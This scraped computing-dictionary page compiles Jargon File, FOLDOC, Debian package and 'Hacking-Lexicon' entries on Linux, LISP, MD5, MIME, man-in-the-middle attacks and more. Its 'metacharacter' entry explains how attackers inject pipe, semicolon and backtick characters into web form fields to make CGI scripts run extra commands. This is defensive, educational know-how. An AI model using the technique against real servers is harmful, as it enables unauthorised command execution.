Invented by John McCarthy at MIT in the late 1950s, it is actually older than any other HLL still in use except FORTRAN. Accordingly, it has undergone considerable adaptive radiation over the years; modern variants are quite different in detail from the original LISP 1.5. The dominant HLL among hackers until the early 1980s, LISP now shares the throne with C. Its partisans claim it is the only language that is truly beautiful. See languages of choice. All LISP functions and programs are expressions that return values; this, together with the high memory utilization of LISPs, gave rise to Alan Perlis's famous quip (itself a take on an Oscar Wilde quote) that "LISP programmers know the value of everything and the cost of nothing". One significant application for LISP has been as a proof by example that most newer languages, such as COBOL and Ada, are full of unnecessary crocks.

LPRng provides emulation packages for the SVR4 lp and lpstat programs, eliminating the need for another print spooler package. These emulation packages can be modified according to local requirements, in order to support older printing systems.

Linux is what GNU aimed to be, and it relies on the GNU toolset. But the Free Software Foundation didn't produce the kernel to go with that toolset until 1999, which was too late. Other, similar efforts like FreeBSD and NetBSD have been technically successful but never caught fire the way Linux has; as this is written in 2000, Linux is seriously challenging Microsoft's OS dominance. It has already captured 31% of the Internet-server market and 25% of general business servers. An earlier version of this entry opined "The secret of Linux's success seems to be that Linus worked much harder early on to keep the development process open and recruit other hackers, creating a snowball effect." Truer than we knew. See bazaar. (Some people object that the name `Linux' should be used to refer only to the kernel, not the entire operating system. This claim is a proxy for an underlying territorial dispute; people who insist on the term `GNU/Linux' want the the FSF to get most of the credit for Linux because RMS and friends wrote many of its user-level tools.

The SPARC, PowerPC, ARM, {PowerMAC} - {OSF}, and 68k ports all support {shells}, {X} and {networking}.  The Intel and SPARC versions have reliable {symmetric multiprocessing}. Work on the kernel is coordinated by Linus Torvalds, who holds the copyright on a large part of it.  The rest of the copyright is held by a large number of other contributors (or their employers).  Regardless of the copyright ownerships, the kernel as a whole is available under the {GNU} {General Public License}.  The GNU project supports Linux as its kernel until the research {Hurd} kernel is completed. This kernel would be no use without {application programs}. The GNU project has provided large numbers of quality tools, and together with other {public domain} software it is a rich Unix environment.  A compilation of the Linux kernel and these tools is known as a Linux distribution.  Compatibility modules and/or {emulators} exist for dozens of other computing environments. The kernel version numbers are significant: the odd numbered series (e.g. 1.3.xx) is the development (or beta) kernel which evolves very quickly.  Stable (or release) kernels have even major version numbers (e.g. 1.2.xx). There is a lot of commercial support for and use of Linux, both by hardware companies such as {Digital}, {IBM}, and {Apple} and numerous smaller network and integration specialists.  There are many commercially supported distributions which are generally entirely under the GPL.  At least one distribution vendor guarantees {Posix} compliance. Linux is particularly popular for {Internet Service Providers}, and there are ports to both parallel supercomputers and {embedded} {microcontrollers}.  {Debian} is one popular {open source} distribution. The pronunciation of "Linux" has been a matter of much debate. Many, including Torvalds, insist on the short I pronunciation /li'nuks/ because "Linus" has an /ee/ sound in Swedish (Linus's family is part of Finland's 6% ethnic-Swedish minority) and Linus considers English short /i/ to be closer to /ee/ than English long /i:/ dipthong.  This is consistent with the short I in words like "linen".  This doesn't stop others demanding a long I /li:'nuks/ following the english pronunciation of "Linus" and "minus".  Others say /li'niks/ following {Minix}, which Torvalds was working on before Linux. From Hyperdictionary From The Free On-line Dictionary of Computing (09 FEB 02) [foldoc]

>&#13;Linux is a completely free reimplementation of the POSIX specification, with SYSV and BSD extensions (which means it looks like Unix, but does not come from the same source code base), which is available in both source code and binary form. Its copyright is owned by Linus Torvalds &#60;torvalds@transmeta.com&#62; and other contributors, and is freely redistributable under the terms of the GNU General Public License (GPL). A copy of the GPL is included with the Linux source; you can also get a copy from ftp://prep.ai.mit.edu/pub/gnu/COPYING Linux, per se, is only the kernel of the operating system, the part that controls hardware, manages files, separates processes, and so forth. There are several combinations of Linux with sets of utilities and applications to form a complete operating system. Each of these combinations is called a distribution of Linux. The word Linux, though it in its strictest form refers specifically to the kernel, is also widely and correctly to refer to an entire operating system built around the Linux kernel. For a list and brief discription of various distributions, see  http://sunsite.unc.edu/LDP/HOWTO/Distribution-HOWTO.html None of these distributions is ``the official Linux''. Linux is not public domain, nor is it `shareware'. It is `free' software, commonly called freeware or Open Source Software[tm] (see http://www.opensource.org), and you may give away or sell copies, but you must include the source code or make it available in the same way as any binaries you give or sell. If you distribute any modifications, you are legally bound to distribute the source for those modifications. See the GNU General Public License for details. Linux is still free as of version 2.0, and will continue to be free. Because of the nature of the GPL to which Linux is subject, it would be illegal for it to be made not free. Note carefully: the `free' part involves access to the source code rather than money; it is perfectly legal to charge money for distributing Linux, so long as you also distribute the source code. This is a generalization; if you want the fine points, read the GPL. Linux runs on 386/486/Pentium machines with ISA, EISA, PCI and VLB busses. MCA (IBM's proprietary bus) is not well-supported in 2.0.x and earlier versions, but support has been added to the current development tree, 2.1.x. If you are interested, see http://glycerine.itsmm.uni.edu/mca There is a port to multiple Motorola 680x0 platforms (currently running on some Amigas, Ataris, and VME machines), which now works quite well. It requires a 68020 with an MMU, a 68030, 68040, or a 68060, and also requires an FPU. Networking and X now work. See news:comp.os.linux.m68k Linux runs well on DEC's Alpha CPU, currently supporting the "Jensen", "NoName", "Cabriolet", "Universal Desktop Box" (better known as the Multia), and many other platforms. For more information, see http://www.azstarnet.com/~axplinux/FAQ.html Linux runs well on Sun SPARCs; most sun4c, sun4m, and sun4u machines now run Linux, with support for sun4 in development. Red Hat Linux is (as of this writing) the only Linux distribution available for SPARCs; see http://www.redhat.com/support/docs/rhl-sparc/ Linux is being actively ported to the PowerPC architecture, including PowerMac (Nubus and PCI), Motorola, IBM, and Be machines. See http://www.cs.nmt.edu/~linuxppc/ and http://www.linuxppc.org/ Ports to other machines, including MIPS (see http://linus.linux.sgi.com and http://lena.fnet.fr/) and ARM, are under way and showing various amounts of progress. Don't hold your breath, but if you are interested and able to contribute, you may well find other developers who wish to work with you. Linux is no longer considered to be in beta testing, as version 1.0 was released on March 14, 1994. There are still bugs in the system, and new bugs will creep up and be fixed as time goes on. Because Linux follows the ``open development model'', all new versions will be released to the public, whether or not they are considered ``production quality''. However, in order to help people tell whether they are getting a stable version or not, the following scheme has been implemented: Versions n.x.y, where x is an even number, are stable versions, and only bug fixes will be applied as y is incremented. So from version 1.2.2 to 1.2.3, there were only bug fixes, and no new features. Versions n.x.y, where x is an odd number, are beta-quality releases for developers only, and may be unstable and may crash, and are having new features added to them all the time. &#62;From time to time, as the currect development kernel stabilizes, it will be frozen as the new ``stable'' kernel, and development will continue on a new development version of the kernel. Note that most releases of the Linux kernel, beta or not, are relatively robust; ``stable'' in this context means ``slow to change'' in addition to ``robust''. The current stable version is 2.0.35 (this will continue to change as new device drivers get added and bugs fixed), and development has also started on the experimental 2.1.x kernels. The Linux kernel source code contains a file, Documentation/Changes, which explains changes that you should be aware of when upgrading from one kernel version to another. However, the great majority of Linux users simply update their Linux distribution occasionally to get a new kernel version. Most versions of Linux, beta or not, are quite robust, and you can keep using those if they do what you need and you don't want to be on the bleeding edge. One site had a computer running version 0.97p1 (dating from the summer of 1992) for over 136 days without an error or crash. (It would have been longer if the backhoe operator hadn't mistaken a main power transformer for a dumpster...) Others have posted uptimes in excess of a year. One site still had a computer running Linux 0.99p15s over 600 days at last report. One thing to be aware of is that Linux is developed using an open and distributed model, instead of a closed and centralized model like much other software. This means that the current development version is always public (with up to a week or two of delay) so that anybody can use it. The result is that whenever a version with new functionality is released, it almost always contains bugs, but it also results in a very rapid development so that the bugs are found and corrected quickly, often in hours, as many people work to fix them. In contrast, the closed and centralized model means that there is only one person or team working on the project, and they only release software that they think is working well. Often this leads to long intervals between releases, long waiting for bug fixes, and slower development. The latest release of such software to the public is sometimes of higher quality, but the development speed is generally much slower. For a discussion of these two models, read ``The Cathedral and the Bazaar'' at http://sagan.earthspace.net/~esr/writings/cathedral-bazaar/ by Eric Raymond. As of September 1, 1998, the current stable version of Linux is 2.0.35, and the latest development version is 2.1.119. From Linux-Intro-HOWTO

>&#13;The free Unix workalike created by Linus Torvalds and friends starting about 1991. The pronunciation /li'nuhks/ is preferred because the name `Linus' has an /ee/ sound in Swedish (Linus's family is part of Finland's 6% ethnic-Swedish minority) and Linus considers English short /i/ to be closer to /ee/ than English long /i:/. This may be the most remarkable hacker project in history -- an entire clone of Unix for 386, 486 and Pentium micros, distributed for free with sources over the net (ports to Alpha and Sparc and many other machines are also in use). Linux is what {GNU} aimed to be, and it relies on the GNU toolset. But the Free Software Foundation didn't produce the kernel to go with that toolset until 1999, which was too late. Other, similar efforts like FreeBSD and NetBSD have been technically successful but never caught fire the way Linux has; as this is written in 2001, Linux is seriously challenging Microsoft's OS dominance. It has already captured 31% of the Internet-server market and 25% of general business servers. An earlier version of this entry opined "The secret of Linux's success seems to be that Linus worked much harder early on to keep the development process open and recruit other hackers, creating a snowball effect." Truer than we knew. See {bazaar}. (Some people object that the name `Linux' should be used to refer only to the kernel, not the entire operating system. This claim is a proxy for an underlying territorial dispute; people who insist on the term `GNU/Linux' want the {FSF} to get most of the credit for Linux because RMS and friends wrote many of its user-level tools. Neither this theory nor the term `GNU/Linux' has gained more than minority acceptance). From Hyperdictionary From Jargon File (4.3.0, 30 APR 2001) [jargon]

The service is notified by the logrotate program, sometimes with a SIGHUP.

>&#13;UNIX has a strict policy of not reporting error messages to the user interface whenever there might be no user around to read those messages. Whereas error messages of interactive commands are sent to the terminal screen, error or information messages produced by non-interactive commands are ``logged'' to files in the directory /var/log/.  A log file is a plain text file that continually has one-liner status messages appended to it by a daemon process. The usual directory for log files is /var/log. The main log files are /var/log/messages and possibly /var/log/syslog. It contains kernel messages and messages from a few primary services. When a service would produce large log files (think web access with thousands of hits per hour), the service would use its own log file. sendmail, for example, uses /var/log/maillog. Actually, lpd does not have a log file of its own--one of its failings. View the system log file with the follow option to tail: tail -f /var/log/messages; tail -f /var/log/syslog. Restarting the lpd service gives messages like: [Not all distributions log this information.] .

>&#13;LaTeX to HTML translator. LaTeX2HTML is a conversion tool that that converts documents written in LaTeX to HTML format. In addition, it offers an easy migration path towards authoring complex hypermedia documents using familiar word-processing concepts. LaTeX2HTML replicates the basic structure of a LaTeX document as a set of interconnected HTML files which can be explored using automatically generated navigation panels. The cross-references, citations, footnotes, the table of contents and the lists of figures and tables, are also translated into hypertext links. Formatting information which has equivalent ``tags'' in HTML (lists, quotes, paragraph breaks, type styles, etc.) is also converted appropriately. The remaining heavily formatted items such as mathematical equations, pictures or tables are converted to images which are placed automatically at the correct positions in the final HTML document. LaTeX2HTML extends LaTeX by supporting arbitrary hypertext links and symbolic cross-references between evolving remote documents. It also allows the specification of conditional text and the inclusion of raw HTML commands. These hypermedia extensions to LaTeX are available as new commands and environments from within a LaTeX document. Pstoimg, the part of latex2html that produces bitmap images from the LaTeX source, can support both GIF and PNG format. Because of certain legal limitations on the use of the GIF image format, GIF support is disabled in this package. From Debian 3.0r0 APT

>&#13;A best-practices principle that states that users have only the minimum access they need, and no more. Example: System administrators typically have multiple accounts with different rights. For example, when I'm logged in as a normal user, I do not have rights to administrator my own machine. I must login as a separate account in order to administer the system, then log out as soon as I'm done. Most UNIX systems will use the hash/pound sign # at the command prompt in order to hint to the user that they have root access and should be careful.

>&#13;Qt is a complete and well-designed multi-platform object-oriented framework for developing graphical user interface (GUI) applications using C++. Qt hasseamless integration with OpenGL/Mesa 3D libraries. Qt is free for development of free software on the X Window System. It includes the complete source code for the X version and makefiles for Linux, Solaris,SunOS, FreeBSD, OSF/1, Irix, BSD/OS, NetBSD, SCO, HP-UX and AIX. This edition of Qt may be modified and distributed under the terms found in the LICENSE.QPL file. Qt also supports Windows 95 and NT, with native look and feel. Code developed for the X version of Qt can be recompiled and run using the Windows 95/NT version of Qt, and vice versa. Qt is currently used in hundreds of software development projects world wide, including the K Desktop Environment (see http://www.kde.org). For more examples, see http://www.trolltech.com/qtprogs.html. Qt has excellent documentation: around 750 pages of postscript and fully cross-referenced online html documentation. It is available on the web:http://doc.trolltech.com/Qt is easy to learn, with consistent naming across all the classes and a 14-chapter on-line tutorial with links into the rest of the documentation. A number of 3rd-party books are also available.Qt dramatically cuts down on development time and complexity in writing user interface software for the X Window System. It allows the programmer to focus directly on the programming task, and not mess around withlow-level Motif/X11 code. Qt is fully object-oriented. All widgets and dialogs are C++ objects, and, using inheritance, creation of new widgets is easy and natural. Qt's revolutionary signal/slot mechanism provides true component programming. Reusable components can work together without any knowledgeof each other, and in a type-safe way. Qt has a very fast paint engine, in some cases ten times faster than other toolkits. The X version is based directly on Xlib and uses neither Motif nor X Intrinsics. Qt is available under two different licenses:  - The Qt Professional Edition License, for developing fully commercial    software: see http://www.trolltech.com/pricing.html  - The Q Public License (QPL), for developing free software (X Window System    only).

This linuxdoc-tools has been designed and implemented only for linuxdoc DTD. If you wish to convert debiandoc DTD documents, Please install and use debiandoc-sgml package. If you wish to convert docbook DTD documents, Please install and use jade (with or without sgmltools-lite). From Debian 3.0r0 APT

>&#13;log out from your X session by pressing a button on your screen. This is a button that appears on your screen when you log into xdm. When you press it, it logs you out of the session. You need to have a file called .xsession in your home dir that starts the logout button in the foreground and your window manager in the background. By putting other things in this file, you can do things like change your background to your favorite image, start a clock and/or a terminal window, or even add a rotating earth or fish tank! You can start any number of programs as long as you background them. An example of .xsession is in /usr/doc/logout-button/examples and if you edit it choosing your favorite window manager, it will try to find and use it. Remember to place it in ~you/.xsession and make it executable. If you don't edit it, it will try to find and use the fvwm2 window mgr. X infrastructure has a mechanism which waits for some program to exit indicating the user wishes to end his X session. logout-button is the simplest form of such a "session manager". The example .xsession file provided in the doc/examples directory picks a window manager to run, starts it in the background, optionally starts other clients (xterm, xearth, xfishtank) also in the background and finally starts the session manager (logout-button) in the foreground, replacing the process and process ID belonging to the shell interpreting the .xsession. Because the infrastructure of X is waiting for this process to exit, when logout-button is pushed, the session is ended. From Debian 3.0r0 APT

Lout may be extended by writing definitions which are much simpler than the equivalent troff or TeX macros. Lout has several advantages over (La)TeX.  It is much smaller, and it is much easier to understand how to do things in Lout (including writing definitions) than in TeX or LaTeX.  Lout's PostScript output is very small and clean. However, it is much less widely used than (La)TeX, so there are fewer add-on definition packages for Lout than for (La)TeX and fewer local experts around to ask about problems.  You are unlikely to find many Lout documents floating around the 'net. From Debian 3.0r0 APT

>&#13;Solve (mixed integer) linear programming problems The linear programming (LP) problem can be formulated as: Solve A.x &#62;= V1, with V2.x maximal. A is a matrix, x a vector of (nonnegative) variables, V1 a vector called the right hand side, and V2 a vector specifying the objective function. An integer linear programming (ILP) problem is an LP with the constraint that all the variables are integers.  In a mixed integer linear programming (MILP) problem, some of the variables are integer and others are real. The program lp_solve solves LP, ILP, and MILP problems. It is slightly more general than suggested above, in that every row of A (specifying one constraint) can have its own (in)equality, &#60;=, &#62;= or =. The result specifies values for all variables. lp_solve uses the 'Simplex' algorithm and sparse matrix methods for pure LP problems.  If one or more of the variables is declared integer, the Simplex algorithm is iterated with a branch and bound algorithm, until the desired optimal solution is found.  lp_solve can read MPS format input files.

On the server side, any Unix-based web server with cgi-script capability should do nicely. The main feature of the indexer is of course the ability to jump easily to the declaration of any global identifier.  Indeed, even all references to global identifiers are indexed.  Quick access to function declarations, data (type) definitions and preprocessor macros makes code browsing just that tad more convenient.

The MAC address is used by your local Internet router in order to direct your traffic to you rather than somebody else in your local area. Key point: The MAC address is 6-bytes long, and must be unique. In order to guarantee uniqueness, equipment vendors are assigned a unique 3-byte prefix, and they then assign their own 3-byte suffix. Thus, the first 3-bytes of a MAC address identifies what kind of hardware you have (3Com, Cisco, Intel, etc.). Key point: The uniqueness property of MAC addresses has interesting implications.

This fingerprint is believed to be "unique"; while it is theoretically possible that two inputs could hash to the same fingerprint, it is nearly statistically impossible. Contrast: Compared to other hash algorithms, MD5 is extremely popular. It is the most popular hashing algorithm, used in SSL, PGP, HTTP authentication, Tripwire, and many other places. MD5 is one of the faster hash algorithms. However, a theoretical weakness has been found such that an attacker may be able to create two separate messages that hash to the same value. Therefore, most use of MD5 is simply for backwards compatibility. History: MD5 was written by Ron Rivest as an enhanced version of the earlier MD4. MD4 is part of many standards, but is considered completely broken by today's standards (and MD5 itself is now considere to have some weaknesses). See also: integrity From Hacking-Lexicon

MIME (Multipurpose Internet Mail Extensions) is a way of representing multiple files inside a single mail message. The way binary data is handled is similar to uuencode, but in a format known as base64. Each MIME attachment to a mail message has a particular type, known as the MIME type. MIME types merely classify the attached file as an image, an audio clip, a formatted document, or some other type of data. The MIME type is a text tag with the format &#60;major&#62;/&#60;minor&#62;. The major part is called the major MIME type and the minor part is called the minor MIME type. Available major types match all the kinds of files that you would expect to exist. They are usually one of application, audio, image, message, text, or video. The application type means a file format specific to a particular utility. The minor MIME types run into the hundreds. A long list of MIME types can be found in /etc/mime.types. If needed, some useful command-line utilities in the same vein as uuencode can create and extract MIME messages. These are mpack, munpack, and mmencode (or mimencode). From Rute-Users-Guide

>&#13;Alongside the web, mail is the top reason for the popularity of the Internet. E-mail is an inexpensive and fast method of time-shifted messaging which, much like the Web, is actually based around sending and receiving plain text files. The protocol used is called the Simple Mail Transfer Protocol (SMTP). The server prorgams that implement SMTP to move mail from one server to another are called Mail Transfer Agents (MTAs). Once upon a time users would have to Telnet into an SMTP server and use a command line mail program like 'mutt' or 'pine' to check their mail. Now, GUI based e-mail clients like Mozilla, Kmail and Outlook allow users to check their email off of a local SMTP sever. Additional protocols like POP3 and IMAP4 are used between the SMTP server and desktop mail client to allow clients to manipulate files on, and download from, their local mail server. The programs that implement POP3 and IMAP4 are called Mail Delivery Agents (MDAs). They are generally seperate from MTAs. From Advanced Linux Pocketbook

>&#13;A philosophical point of view: "The power of the network increases exponentially by the number of computers connected to it. Therefore, the every computer added to the network both uses it as a resource while adding resources in a spiral of increasing value and choice." -- Dr. Bob M. Metcalfe, inventor of Ethernet, co-founder of 3Com, editor-in-chief of InfoWorld. The idea is that the power of the Internet is not simply all the websites that you can access (linear), but the power represented by everyone else also on the Internet (exponential). For example, organizations like http://www.distributed.net/ cannot only harness lots of machines in order to tackle large problems (linear), but they also can exploit the word-of-mouth on the Internet to sign up (exponential). Similarly, consider the growth in sites like http://www.slashdot.org/ that start out as hobbyist sites, but eventually blossom into large money making ventures, tossing pre-Internet-age business philosophies on their ear. Key point: Hacker attacks grow exponentially because more and more hackers are getting online (especially from 3rd world countries) and more and more resources (businesses) are getting online. Key point: The amount of computing resources a hacker can tap into from his/her computer desktop is more than the combined might of all governments and militaries. From Hacking-Lexicon

>&#13;/mak'roh/ n. [techspeak] A name (possibly followed by a formal arg list) that is equated to a text or symbolic expression to which it is to be expanded (possibly with the substitution of actual arguments) by a macro expander. This definition can be found in any technical dictionary; what those won't tell you is how the hackish connotations of the term have changed over time. The term `macro' originated in early assemblers, which encouraged the use of macros as a structuring and information-hiding device. During the early 1970s, macro assemblers became ubiquitous, and sometimes quite as powerful and expensive as HLLs, only to fall from favor as improving compiler technology marginalized assembler programming (see languages of choice). Nowadays the term is most often used in connection with the C preprocessor, LISP, or one of several special-purpose languages built around a macro-expansion facility (such as TeX or Unix's [nt]roff suite). Indeed, the meaning has drifted enough that the collective `macros' is now sometimes used for code in any special-purpose application control language (whether or not the language is actually translated by text expansion), and for macro-like entities such as the `keyboard macros' supported in some text editors (and PC TSR or Macintosh INIT/CDEV keyboard enhancers).

In source code, some non-obvious constant whose value is significant to the operation of a program and that is inserted inconspicuously in-line (hardcoded), rather than expanded in by a symbol set by a commented #define. Magic numbers in this sense are bad style. 2. A number that encodes critical information used in an algorithm in some opaque way. The classic examples of these are the numbers used in hash or CRC functions, or the coefficients in a linear congruential generator for pseudo-random numbers. This sense actually predates and was ancestral to the more commonsense 1. 3. Special data located at the beginning of a binary data file to indicate its type to a utility. Under Unix, the system and various applications programs (especially the linker) distinguish between types of executable file by looking for a magic number. Once upon a time, these magic numbers were PDP-11 branch instructions that skipped over header data to the start of executable code; 0407, for example, was octal for `branch 16 bytes relative'. Many other kinds of files now have magic numbers somewhere; some magic numbers are, in fact, strings, like the !&#60;arch&#62; at the beginning of a Unix archive file or the %! leading PostScript files. Nowadays only a wizard knows the spells to create magic numbers. How do you choose a fresh magic number of your own? Simple -- you pick one at random. See? It's magic! The magic number, on the other hand, is 7+/-2. See "The magical number seven, plus or minus two: some limits on our capacity for processing information" by George Miller, in the "Psychological Review" 63:81-97 (1956). This classic paper established the number of distinct items (such as numeric digits) that humans can hold in short-term memory.

>&#13;An automatic mail-processing tool Mailagent allows you to process your mail automatically. This has far more functionality than procmail, and is easier to configure (providing, of course, that you grok perl). As a mail processing tool, this slices, it dices, it ... Given a set of lex-like rules, you are able to file mails to specific folders (plain Unix-style folders and also MMDF and MH ones), forward messages to a third person, pipe a message to a command or even post the message to a newsgroup. It is also possible to process messages containing some commands. You may also set up a vacation program, which will automatically answer your mail while you are not there, but more flexibly than the Unix command of the same name. You only need to supply a message to be sent and the frequency at which this will occur. Some simple macro substitutions allow you to re-use some parts of the mail header into your vacation message, for a more personalized reply. You may also set up a generic mail server, without the hassle of the lower-level concerns like error recovery, logging or command parsing. The mailagent is not usually invoked manually but is rather called via the filter program, which is in turn invoked by sendmail. That means you must have sendmail/smail on your system to use this. You also must have perl to run the mailagent scripts. It is possible to extend the mailagent filtering commands by implementing them in perl and then having them automagically loaded when used. Please note that on Debian systems, mailagent can not lock /var/spool/mail directory mailboxes, and thus one must put a catch all rule saving all mail in ones home directory. This is because Debian MDA policy requires them to be setgid mail, and making anything as extensible as mailagent setgid anything negates any benefit of having group permission protection.

>&#13;man-in-the-middle attack
</B
></DT
><DD
><P
>&#13;An attacker where the hacker interposes himself in the middle between two people. Culture: Historically, when talking about such attacks, the hacker is given male names starting with the letter M (like Mallory, Mark, Mawry, etc.). Key point: This often means that both sides of a connection really need to authenticate themselves. For example, when you log into a server, you really want to be assured it is the real server you are talking to, rather than Mark who is forwarding your requests to the real server using your identity. Key point: In the year 2000, Dug Song released a toolkit for interposing yourself in between SSL and SSH connections. It relies upon the fact that client systems do not validate the certificates on the server. Therefore, the man-in-the-middle attack can present any certificate to the client, which will not realize it is not the certificate of the server. From Hacking-Lexicon

>&#13;metacharacter (shell metacharacters)
</B
></DT
><DD
><P
>&#13;A metacharacter is one that represents some other concept rather than itself. For example, in entering in filenames, the metacharacter '*' doesn't represent an astrisk, but instead tells the system to match on any character. For example, looking for the filename "*.txt" will look for all files ending in the real characters ".txt". On UNIX, the most important characters are "shell" metacharacters. The reason they are important is because the shell is often used by one program to spawn another. This means that input provided to the parent program will be passed to the shell, then to the child program. If a hacker can craft special input using metacharacters, the hacker may be able to cause that shell to do something unexpected. E-mail address: A classic example is a webpage containing a FORM that asks for a user's e-mail address. The software (such as a CGI script) will often just invoke the 'mail' program using the shell. By inserting shell metacharacters into the field for the email address, a hacker may be able to execute some other program on the web server. Example: Some UNIX shell metacharacters are: [] () {} ~ # $ ^ &#38; * \ | ; &#60;&#62; ? ` ' | (pipe) The pipe metacharacter links two command-line programs together, causing the output from the first program to become the input into the second program. Hackers don't care about redirecting input/output, but they will use the pipe simply as a way of confusing the shell into executing a second program. When a hacker attempts to break into a webserver, one of the first things they will do is to look for all the forms on the website and provide input containing pipe characters to see if they can force the system to execute commands. ; (semicolon) Similar to the pipe metacharacter in its ability to run multiple programs at once. However, the semicolon simply launches the programs without redirecting input/output. ` (back-quote, back-tick) The backwards quote metacharacter is similar to the pipe in that it can take the output from one command and pass it another. In this case, the output of the second program is provided as command-line input into the first. $ (dollar sign) The dollar sign prefixes a variable name. Thus, the string $FOO represents the value of the variable named "FOO" rather than the letters 'F', 'O', 'O'. In particular, you'll commonly see $IFS in attacks, where the IFS variable indicates the character used to separate lines in the shell. &#38;&#38; and || These are logical operations used in shell programming. They look at the "result" of a program and "conditionally" execute other programs. A hacker doesn't care about this intended use, but can instead use these as yet another way to execute additional commands. See also: taint, CGI From Hacking-Lexicon

>&#13;A MIX emulator and MIXAL interpreter Mixal is an implementation of the imaginary computer called MIX and its assembly language MIXAL, which were invented by Donald E. Knuth in the 1960's for use in his monumental and yet unfinished book series "The Art of Computer Programming". All actual programs and all programming exercises in the series are written in MIXAL. This package contains a modified version of Darius Bacon's Mixal implementation.  It takes a MIXAL source file, translates it to MIX machine code and then executes the resulting program, all in a single run.  The result of the assembler step cannot be extracted to a file.  Similarly, one cannot take a precompiled MIX program and try to execute it in this emulator - only MIXAL source is accepted. The MIX emulator does not support floating-point operations nor the tape devices described in Knuth's book.  This is not fatal, however, and most of the programs and exercise answers in Knuth's book can be run in this MIXAL implementation. From Debian 3.0r0 APT

>&#13;Mkinitrd creates filesystem images for use as initial ramdisk (initrd) images.  These ramdisk images are often used to preload the block device modules (SCSI or RAID) needed to access the root filesystem. In other words, generic kernels can be built without drivers for any SCSI adapters which load the SCSI driver as a module. Since the kernel needs to read those modules, but in this case it isn't able to address the SCSI adapter, an initial ramdisk is used. The initial ramdisk is loaded by the operating system loader (normally LILO) and is available to the kernel as soon as the ramdisk is loaded.  The ramdisk image loads the proper SCSI adapter and allows the kernel to mount the root filesystem.  The mkinitrd program creates such a ramdisk using information found in the /etc/modules.conf file.

>&#13;Creates an initrd image suitable for booting from a live CD-ROM This is the package used by the Gibraltar project to create the initrd images used for booting from CD-ROM. The bootable CD-ROMs are actual live CD-ROMs. That is, the root file system is the CD-ROM, ramdisks are the only things needed for operation without a harddisk. Although a harddisk can be used for e.g. storing log files permanently or when the machine acts as a proxy server. Given a kernel image and the corresponding modules, it creates a complete boot image that can be written to floppy or be used as El Torito image for a bootable CD-ROM. Upon bootup, the initrd image will try to locate an ATAPI CD-ROM drive. When this does not succeed, it auto-probes for SCSI adapters and tries to locate SCSI drives. It also works when multiple CD-ROM drives are installed in the system by checking if the inserted CD is the correct one for booting. The package can be of use to developers and packagers who want to create their own bootable, live Debian CD-ROM. It will probably not be of any use to others. From Debian 3.0r0 APT

>&#13;n. [common] A general state, usually used with an adjective describing the state. Use of the word `mode' rather than `state' implies that the state is extended over time, and probably also that some activity characteristic of that state is being carried out. "No time to hack; I'm in thesis mode." In its jargon sense, `mode' is most often attributed to people, though it is sometimes applied to programs and inanimate objects. In particular, see hack mode, day mode, night mode, demo mode, fireworks mode, and yoyo mode; also talk mode. One also often hears the verbs `enable' and `disable' used in connection with jargon modes. Thus, for example, a sillier way of saying "I'm going to crash" is "I'm going to enable crash mode now". One might also hear a request to "disable flame mode, please". In a usage much closer to techspeak, a mode is a special state that certain user interfaces must pass into in order to perform certain functions. For example, in order to insert characters into a document in the Unix editor vi, one must type the "i" key, which invokes the "Insert" command. The effect of this command is to put vi into "insert mode", in which typing the "i" key has a quite different effect (to wit, it inserts an "i" into the document). One must then hit another special key, "ESC", in order to leave "insert mode". Nowadays, modeful interfaces are generally considered losing but survive in quite a few widely used tools built in less enlightened times.  From Jargon Dictionary

>&#13;n. [common] A flag, usually in hardware, that selects between two (usually quite different) modes of operation. The connotations are different from flag bit in that mode bits are mainly written during a boot or set-up phase, are seldom explicitly read, and seldom change over the lifetime of an ordinary program. The classic example was the EBCDIC-vs.-ASCII bit (#12) of the Program Status Word of the IBM 360.  From Jargon Dictionary

Point: Both Netscape and Microsoft web-browsers identify themselves as being "Mozilla" in the User-Agent: field. When Netscape officially created the name "Navigator" for their web-browser, the engineers didn't bother changing this field. When Microsoft came out with version 3.0 of their "Internet Explorer", they attempted to emulate all the features of Navigator. In order to take advantage of web-sites that provided richer multimedia content based upon whether Mozilla was running, Microsoft put "Mozilla" as the version of their browser, with additional content identifying itself as "MSIE".

Along with providing a comprehensive and configurable log of all dynamic memory operations that occurred during the lifetime of a program, the mpatrol library performs extensive checking to detect any misuse of dynamically allocated memory. All logging and tracing output from the mpatrol library is sent to a separate log file in order to keep its diagnostics separate from any that the program being tested might generate. A wide variety of library settings can also be changed at run-time via an environment variable, thus removing the need to recompile or relink in order to change the library's behaviour. All of this functionality can be integrated into existing code through the inclusion of a single header file at compile-time. http://www.cbmamiga.demon.co.uk/mpatrol From Debian 3.0r0 APT

>&#13;A Free command-line mp3 player, compatible with mpg123 mpg321 is a clone of the popular mpg123 command-line mp3 player. It should function as a drop-in replacement for mpg123 in many cases. While some of the functionality of mpg123 is not yet implemented, mpg321 should function properly in most cases for most people, such as for frontends such as gqmpeg. mpg321 is based on the mad MPEG audio decoding library. It therefore is highly accurate, and also uses only fixed-point calculation, making it more efficient on machines without a floating-point unit. While mpg321 is not as fast as the non-free mpg123 on systems which have a floating point unit, it comes under a fully Free license, which allows greater freedom to its users. For most people who want mpg123, mpg321 is a better alternative. From Debian 3.0r0 APT

In addition to monitoring via SNMP, MRTG can also generate graphs based on the output of any application, allowing one to generate graphs of anything that needs monitoring (for example, CPU and memory usage, email volumes, web hits, etc). For faster data collection, MRTG can also interface to RRDtool. For more information, see http://www.ee.ethz.ch/~oetiker/webtools/mrtg/.

>&#13;A computer may have multiple adapters and multiple IP addresses. We called these multi-homed hosts. The existence of such machines makes some security processes difficult. UDP based transactions (like DNS) sometimes show anomalies because the responses come back from IP addresses different than the one the request was sent to. Sun workstations demonstrate and even more difficult problem: if multiple adapters are installed within the workstation, they are all assigned the same MAC address. Sometimes people hook both adapters to the same ethernet network. This means that every incoming packet is received by both adapters, so every request is seen multiple times, and responded to multiple times. The symptoms are that on UDP based protocols, every request sent to the multi-homed Sun computer gets multiple responses back. Key point: Misconfigured multi-homed hosts are common enough that it makes distinguishing their anomalies vs. hacker anomalies difficult. From Hacking-Lexicon

